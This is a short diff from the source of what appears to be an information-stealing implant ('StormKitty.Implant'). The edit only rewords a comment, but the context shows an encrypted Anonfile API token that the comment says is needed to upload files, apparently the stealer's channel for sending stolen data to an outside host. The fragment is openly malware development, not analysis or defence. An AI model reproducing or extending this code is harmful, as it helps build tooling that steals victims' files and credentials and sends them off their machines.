@@ -116,7 +116,7 @@ namespace StormKitty.Implant
                 .Replace("ENCRYPTED:", "")));
         }
 
-        // Anonfile API key
+        // Anonfile API key required to upload files
         public static string AnonApiToken = Decrypt(new byte[] { 169, 182, 79, 179, 252, 54, 138, 148, 167, 99, 216, 216, 199, 219, 10, 249, 131, 166, 170, 145, 237, 248, 142, 78, 196, 137, 101, 62, 142, 107, 245, 134, });
     }
 }
